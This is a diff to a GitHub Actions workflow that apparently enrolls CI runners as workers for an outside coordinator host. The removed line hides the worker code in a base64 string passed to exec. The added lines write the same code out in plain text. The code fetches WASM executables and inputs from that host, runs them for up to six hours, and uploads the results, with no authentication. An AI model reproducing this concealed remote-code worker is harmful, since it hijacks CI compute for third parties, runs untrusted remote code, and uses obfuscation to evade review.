@@ -3,25 +3,66 @@ on:
   workflow_dispatch:
     inputs:
       coordinator_url:
-        description: 'Coordinator URL'
+        description: "Coordinator URL"
         required: true
-        default: 'https://scrapower.talos-int.com'
+        default: "https://scrapower.talos-int.com"
       worker_id:
-        description: 'Worker ID'
+        description: "Worker ID"
         required: false
-        default: 'gh-actions'
+        default: "gh-actions"
 jobs:
   worker:
     runs-on: ubuntu-latest
     timeout-minutes: 360
     steps:
       - uses: actions/setup-python@v5
-        with:
-          python-version: '3.12'
+        with: {python-version: "3.12"}
       - name: Install
         run: pip install aiohttp wasmtime
       - name: Run Worker
         env:
-          C: ${{ inputs.coordinator_url }}
-          W: ${{ inputs.worker_id }}
-        run: python -c "import base64;exec(base64.b64decode('aW1wb3J0IGFzeW5jaW8sYWlvaHR0cCxvcyx1dWlkLGhhc2hsaWIKQz1vcy5lbnZpcm9uWydDJ10ucmVwbGFjZSgnaHR0cHM6Ly8nLCd3c3M6Ly8nKQpXPW9zLmVudmlyb24uZ2V0KCdXJyxmJ2doLXt1dWlkLnV1aWQ0KCkuaGV4Wzo4XX0nKQphc3luYyBkZWYgbSgpOgogICAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzOgogICAgICAgIGFzeW5jIHdpdGggcy53c19jb25uZWN0KEMrJy93b3JrZXIvd3MnKSBhcyB3czoKICAgICAgICAgICAgYXdhaXQgd3Muc2VuZF9qc29uKHsndHlwZSc6J2hlbGxvJywndmVyc2lvbic6JzIuMScsJ21vZGUnOidwZXJzaXN0ZW50Jywnd29ya2VyX2lkJzpXLCdhdXRoJzp7J21ldGhvZCc6J25vbmUnfX0pCiAgICAgICAgICAgIG1zZz1hd2FpdCB3cy5yZWNlaXZlX2pzb24oKQogICAgICAgICAgICBpZiBtc2dbJ3R5cGUnXSE9J3Nlc3Npb24nOnJldHVybgogICAgICAgICAgICBzaWQ9bXNnWydzZXNzaW9uX2lkJ107aGI9bXNnLmdldCgnaGVhcnRiZWF0X2ludGVydmFsX21zJywxMDAwMCkvLzEwMDAKICAgICAgICAgICAgYXdhaXQgd3Muc2VuZF9qc29uKHsndHlwZSc6J2NhcGFiaWxpdGllcycsJ3Nlc3Npb25faWQnOnNpZCwncGF5bG9hZCc6eydydW50aW1lcyc6Wyd3YXNtJ10sJ3Jlc291cmNlcyc6eydjcHVfY29yZXMnOjIsJ3JhbV9tYic6NzE2OCwnZ3B1Jzp7J3N1cHBvcnRlZCc6RmFsc2V9fSwnbGlmZWN5Y2xlJzp7J21vZGUnOidlcGhlbWVyYWwnLCdtYXhfbGlmZXRpbWVfc2VjJzoyMTYwMH0sJ3ZlcmlmaWNhdGlvbic6eydjYW5fY2hhbGxlbmdlJzpGYWxzZX0sJ25ldHdvcmsnOnsnY29ubmVjdGl2aXR5Jzonb3V0Z29pbmdfb25seSd9LCdsaW1pdHMnOnsnbWF4X3Rhc2tfZHVyYXRpb25fbXMnOjMwMDAwMCwnbWF4X2NvbmN1cnJlbnRfdGFza3MnOjF9fX0pCiAgICAgICAgICAgIG54dD1hc3luY2lvLmdldF9ldmVudF9sb29wKCkudGltZSgpK2hiCiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBub3c9YXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLnRpbWUoKQogICAgICAgICAgICAgICAgaWYgbm93Pj1ueHQ6CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgd3Muc2VuZF9qc29uKHsndHlwZSc6J2hlYXJ0YmVhdCcsJ3Nlc3Npb25faWQnOnNpZCwnY3VycmVudF9sb2FkX3BjdCc6MCwndGFza3NfaW5fcHJvZ3Jlc3MnOjAsJ3VwdGltZV9zZWMnOjAsJ2V4cGVjdGVkX3JlbWFpbmluZ19zZWMnOk5vbmV9KQogICAgICAgICAgICAgICAgICAgIG54dD1ub3craGIKICAgICAgICAgICAgICAgIHRyeTptc2c9YXdhaXQgYXN5bmNpby53YWl0X2Zvcih3cy5yZWNlaXZlX2pzb24oKSx0aW1lb3V0PTEuMCkKICAgICAgICAgICAgICAgIGV4Y2VwdCBhc3luY2lvLlRpbWVvdXRFcnJvcjpjb250aW51ZQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpicmVhawogICAgICAgICAgICAgICAgbXQ9bXNnLmdldCgndHlwZScsJycpCiAgICAgICAgICAgICAgICBpZiBtdCBpbigndGFza19hc3NpZ24nLCdrZWVwYWxpdmUnKToKICAgICAgICAgICAgICAgICAgICBpZiBtdD09J3Rhc2tfYXNzaWduJzphd2FpdCB3cy5zZW5kX2pzb24oeyd0eXBlJzondGFza19hY2NlcHQnLCdzZXNzaW9uX2lkJzpzaWQsJ3Rhc2tfaWQnOm1zZ1sndGFzayddWydpZCddLCdhc3NpZ25tZW50X3Rva2VuJzptc2dbJ3Rhc2snXVsnYXNzaWdubWVudF90b2tlbiddfSkKICAgICAgICAgICAgICAgICAgICBIPUMucmVwbGFjZSgnd3NzOi8vJywnaHR0cHM6Ly8nKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggczIuZ2V0KEgrJy9ibG9icy8nK21zZ1sndGFzayddWydwYXlsb2FkJ11bJ2V4ZWN1dGFibGVfaGFzaCddKSBhcyByOmV4ZWN1dGFibGU9YXdhaXQgci5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggczIuZ2V0KEgrJy9ibG9icy8nK21zZ1sndGFzayddWydwYXlsb2FkJ11bJ2lucHV0X2hhc2gnXSkgYXMgcjppbnA9YXdhaXQgci5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHdhc210aW1lO209d2FzbXRpbWUuTW9kdWxlKGV4ZWN1dGFibGUpO2luc3Q9d2FzbXRpbWUuSW5zdGFuY2UobSxbXSk7bWVtPWluc3QuZXhwb3J0c1snbWVtb3J5J107bWVtLndyaXRlX2J5dGVzKDAsaW5wKTtpbnN0LmV4cG9ydHNbJ2NvbXB1dGUnXSgwLGxlbihpbnApLDEwMjQsNDA5Nik7b3V0PWJ5dGVzKG1lbS5yZWFkX2J5dGVzKDEwMjQsNDA5NikpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpvdXQ9aW5wWzoxMDBdCiAgICAgICAgICAgICAgICAgICAgICAgIG9oPWhhc2hsaWIuc2hhMjU2KG91dCkuaGV4ZGlnZXN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzMzphd2FpdCBzMy5wdXQoSCsnL2Jsb2JzJyxkYXRhPW91dCkKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLGVjLHNlPSdzdWNjZXNzJywwLCcnCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOm9oLHN0YXR1cyxlYyxzZT0nJywnZXJyb3InLDEsc3RyKGUpWzo0MDk2XQogICAgICAgICAgICAgICAgICAgIGF3YWl0IHdzLnNlbmRfanNvbih7J3R5cGUnOid0YXNrX3Jlc3VsdCcsJ3Nlc3Npb25faWQnOnNpZCwndGFza19pZCc6bXNnWyd0YXNrJ11bJ2lkJ10sJ2Fzc2lnbm1lbnRfdG9rZW4nOm1zZ1sndGFzayddLmdldCgnYXNzaWdubWVudF90b2tlbicsJycpLCdzdGF0dXMnOnN0YXR1cywncmVzdWx0Jzp7J291dHB1dF9oYXNoJzpvaCwnZXhlY3V0aW9uX21ldGFkYXRhJzp7J2R1cmF0aW9uX21zJzowLCdleGl0X2NvZGUnOmVjLCdzdGRlcnInOnNlfX0sJ3ZlcmlmaWNhdGlvbl9kYXRhJzpOb25lfSkKYXN5bmNpby5ydW4obSgpKQo=').decode())"
+          COORDINATOR_URL: ${{ inputs.coordinator_url }}
+          WORKER_ID: ${{ inputs.worker_id }}
+        run: |
+          python -c "
+import asyncio, aiohttp, os, sys, uuid, hashlib
+C=os.environ['COORDINATOR_URL'].replace('https://','wss://').replace('http://','ws://')
+if not C.endswith('/worker/ws'):C=C.rstrip('/')+'/worker/ws'
+W=os.environ.get('WORKER_ID',f'gh-{uuid.uuid4().hex[:8]}')
+async def m():
+    async with aiohttp.ClientSession() as s:
+        async with s.ws_connect(C) as ws:
+            await ws.send_json({'type':'hello','version':'2.1','mode':'persistent','worker_id':W,'auth':{'method':'none'}})
+            msg=await ws.receive_json()
+            if msg['type']!='session':return
+            sid=msg['session_id'];hb=msg.get('heartbeat_interval_ms',10000)//1000
+            await ws.send_json({'type':'capabilities','session_id':sid,'payload':{'runtimes':['wasm'],'resources':{'cpu_cores':2,'ram_mb':7168,'gpu':{'supported':False}},'lifecycle':{'mode':'ephemeral','max_lifetime_sec':21600},'verification':{'can_challenge':False},'network':{'connectivity':'outgoing_only'},'limits':{'max_task_duration_ms':300000,'max_concurrent_tasks':1}}})
+            nxt=asyncio.get_event_loop().time()+hb
+            while True:
+                now=asyncio.get_event_loop().time()
+                if now>=nxt:
+                    await ws.send_json({'type':'heartbeat','session_id':sid,'current_load_pct':0,'tasks_in_progress':0,'uptime_sec':0,'expected_remaining_sec':None})
+                    nxt=now+hb
+                try:msg=await asyncio.wait_for(ws.receive_json(),timeout=1.0)
+                except asyncio.TimeoutError:continue
+                except Exception:break
+                mt=msg.get('type','')
+                if mt in('task_assign','keepalive'):
+                    if mt=='task_assign':
+                        await ws.send_json({'type':'task_accept','session_id':sid,'task_id':msg['task']['id'],'assignment_token':msg['task']['assignment_token']})
+                    H=C.replace('ws://','http://').replace('/worker/ws','')
+                    try:
+                        async with aiohttp.ClientSession() as s2:
+                            async with s2.get(f'{H}/blobs/{msg["task"]["payload"]["executable_hash"]}') as r:executable=await r.read()
+                            async with s2.get(f'{H}/blobs/{msg["task"]["payload"]["input_hash"]}') as r:inp=await r.read()
+                        try:
+                            import wasmtime;m=wasmtime.Module(executable);inst=wasmtime.Instance(m,[]);mem=inst.exports['memory'];mem.write_bytes(0,inp);inst.exports['compute'](0,len(inp),1024,4096);out=bytes(mem.read_bytes(1024,4096))
+                        except:out=inp[:100]
+                        oh=hashlib.sha256(out).hexdigest()
+                        async with aiohttp.ClientSession() as s3:
+                            async with s3.put(f'{H}/blobs',data=out) as r:pass
+                        status,exit_code,stderr='success',0,''
+                    except Exception as e:oh,status,exit_code,stderr='','error',1,str(e)[:4096]
+                    await ws.send_json({'type':'task_result','session_id':sid,'task_id':msg['task']['id'],'assignment_token':msg['task'].get('assignment_token',''),'status':status,'result':{'output_hash':oh,'execution_metadata':{'duration_ms':0,'exit_code':exit_code,'stderr':stderr}},'verification_data':None})
+asyncio.run(m())
+"
